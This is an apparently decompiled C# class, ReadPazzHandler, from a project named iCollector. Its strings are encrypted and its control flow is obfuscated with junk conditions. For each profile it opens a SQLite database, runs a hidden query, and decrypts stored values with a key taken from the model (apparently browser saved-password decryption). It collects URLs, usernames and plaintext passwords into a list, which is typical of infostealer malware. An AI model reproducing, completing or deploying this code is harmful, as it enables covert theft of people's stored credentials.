using System;
using System.Collections.Generic;
using System.Data;
using iCollector.Job.Model;
using iCollector.Util;
using Microsoft.Data.Sqlite;

namespace iCollector.Job.Handler;

internal class ReadPazzHandler
{
	private static string CLAZZ_NAME_SE = "CfQyV/J4nXGGgV0zDnCNbQ==.5B3sfWqhhlI+Wtcv6PMUoMacdmnjhs4cMISawJnbT4E=";

	private static string CLAZZ_NAME = SecurityUtils.ReadStructEncrypted(CLAZZ_NAME_SE);

	private static readonly string Q1_SE = "O7IlgJDLZYxP1aLYbEHI9w==.nFNY6/0kqSWsPJgFKMx4y3HnhV9DMk0+HIOe+Fe60jtNL2zn1Gtn8rRUToX2vHNjbI/poBuNofKo1X8WSdX9ctggi6L2kfJreEfZie/61PGG8KLo+tN/r79J8W01JG0gHzm0kv0aReaf2B04Uf/PUVgvLbJR3VEZc3YyRa6TIxA=";

	private static readonly string Q1 = SecurityUtils.ReadStructEncrypted(Q1_SE);

	private static readonly string LOG_01_1_SE = "lykugxPMWK1NZsB8MkEFLA==.hMA+eUHQkpK5/NaTNe3dcT8AD3QPVN70u8bkPb9mc9HsVrvJbxFCSG9AZJSE/wPv";

	private static readonly string LOG_01_1 = SecurityUtils.ReadStructEncrypted(LOG_01_1_SE);

	private static readonly string LOG_02_1_SE = "W1oNB3OQ+uE5/DkOebBGCQ==.1fa3A7sCSYjdU6j18c+Umaxkbto129WzlcV9PdNU+FpqdvYnIueOxjUbDPc6B2zc";

	private static readonly string LOG_02_1 = SecurityUtils.ReadStructEncrypted(LOG_02_1_SE);

	private static readonly string PWD_SE = "wKGzxAGzV4HhF4SUbnqGUg==.r355lJFD47rinxjJUZrveUUcyUXTgMyWc8oAaRgBk1w=";

	private static readonly string PWD = SecurityUtils.ReadStructEncrypted(PWD_SE);

	private static readonly string URL_SE = "++YLzMD/bFQb3vmjBJTB1g==.e5gY7T09c3psp5NhYKlJQGzgzwBwtSh04I7Iezzl59Y=";

	private static readonly string URL = SecurityUtils.ReadStructEncrypted(URL_SE);

	private static readonly string UNAME_SE = "tBhZNJBsNxSoOgUB2go+/w==.H4M01swPLfy0JnilZnBrH71ZYtV/Hc02WI15tasLAvw=";

	private static readonly string UNAME = SecurityUtils.ReadStructEncrypted(UNAME_SE);

	private Logger log = Logger.Instance();

	private LogContext ctx = new LogContext(CLAZZ_NAME);

	public void Enrich(CKModel model)
	{
		if (model.Profiles == null)
		{
			return;
		}
		int num = model.Profiles.Count;
		List<CKProfile>.Enumerator enumerator2 = default(List<CKProfile>.Enumerator);
		CKProfile cKProfile = default(CKProfile);
		while (num != 0)
		{
			while (true)
			{
				List<CKProfile>.Enumerator enumerator = model.Profiles.GetEnumerator();
				if (8u != 0 && 0 == 0)
				{
					enumerator2 = enumerator;
				}
				try
				{
					while (true)
					{
						IL_00d1:
						int num2 = (enumerator2.MoveNext() ? 1 : 0);
						if (0 == 0)
						{
							while (num2 != 0)
							{
								while (true)
								{
									CKProfile current = enumerator2.Current;
									if (0 == 0 && 0 == 0)
									{
										cKProfile = current;
									}
									Logger logger = log;
									LogContext logContext = ctx;
									string message = LOG_01_1 + cKProfile.Path;
									if (2u != 0 && 7u != 0)
									{
										logger.Info(logContext, message);
									}
									CKProfile cKProfile2 = cKProfile;
									List<DynamicObject> pazzValues = new List<DynamicObject>();
									if (0 == 0 && 3u != 0)
									{
										cKProfile2.PazzValues = pazzValues;
									}
									if (string.IsNullOrEmpty(cKProfile.PazzPath))
									{
										break;
									}
									num2 = 0;
									if (num2 != 0)
									{
										goto IL_00db;
									}
									if (num2 != 0)
									{
										continue;
									}
									goto IL_0081;
								}
								goto IL_00d1;
								IL_00db:;
							}
							break;
						}
						goto IL_009e;
						IL_009e:
						Logger logger2 = log;
						LogContext logContext2 = ctx;
						string lOG_02_ = LOG_02_1;
						int count = cKProfile.PazzValues.Count;
						int num3;
						if (uint.MaxValue != 0 && 5u != 0)
						{
							num3 = count;
						}
						string message2 = lOG_02_ + num3;
						if (0 == 0)
						{
							if (0 == 0)
							{
								logger2.Info(logContext2, message2);
							}
							if (false)
							{
							}
						}
						continue;
						IL_0081:
						num2 = (DataSourceHelper.ExecuteQuery(cKProfile.PazzPath, Q1, CreateConsumer(model, cKProfile), 500) ? 1 : 0);
						goto IL_009e;
					}
				}
				finally
				{
					((IDisposable)enumerator2).Dispose();
				}
				num = 3;
				if (num == 0)
				{
					break;
				}
				if (num != 0)
				{
					return;
				}
			}
		}
	}

	private Consumer<SqliteDataReader>.Accept CreateConsumer(CKModel model, CKProfile profile)
	{
		CKModel model2 = model;
		CKProfile profile2 = profile;
		return delegate(SqliteDataReader reader)
		{
			string text2 = default(string);
			string text3 = default(string);
			string text4 = default(string);
			DynamicObject dynamicObject2 = default(DynamicObject);
			while (true)
			{
				string text = WinAPI.ReadValue(DataSourceHelper.GetBytes(reader, 2), model2.LcsBytes, 3);
				if (3u != 0)
				{
					if (0 == 0)
					{
						text2 = text;
					}
					if (false)
					{
						break;
					}
				}
				bool num;
				while (0 == 0)
				{
					string @string = ((IDataRecord)reader).GetString(0);
					if (0 == 0 && 7u != 0)
					{
						text3 = @string;
					}
					string string2 = ((IDataRecord)reader).GetString(1);
					if (0 == 0 && 0 == 0)
					{
						text4 = string2;
					}
					num = string.IsNullOrEmpty(text4);
					while (true)
					{
						if (num)
						{
							return;
						}
						if (7 == 0)
						{
							break;
						}
						num = string.IsNullOrEmpty(text2);
						if (false)
						{
							continue;
						}
						goto IL_0050;
					}
				}
				continue;
				IL_0050:
				if (!num && !string.IsNullOrEmpty(text3))
				{
					DynamicObject dynamicObject = new DynamicObject();
					if (0 == 0 && 0 == 0)
					{
						dynamicObject2 = dynamicObject;
					}
					DynamicObject dynamicObject3 = dynamicObject2;
					string pWD = PWD;
					string value = text2;
					if (uint.MaxValue != 0)
					{
						dynamicObject3.Put(pWD, value);
					}
					break;
				}
				return;
			}
			do
			{
				DynamicObject dynamicObject4 = dynamicObject2;
				string uRL = URL;
				string value2 = text3;
				if (2 == 0)
				{
					break;
				}
				dynamicObject4.Put(uRL, value2);
			}
			while (3 == 0);
			DynamicObject dynamicObject5 = dynamicObject2;
			string uNAME = UNAME;
			string value3 = text4;
			if (0 == 0)
			{
				dynamicObject5.Put(uNAME, value3);
			}
			List<DynamicObject> pazzValues = profile2.PazzValues;
			DynamicObject item = dynamicObject2;
			if (3u != 0)
			{
				pazzValues.Add(item);
			}
		};
	}
}
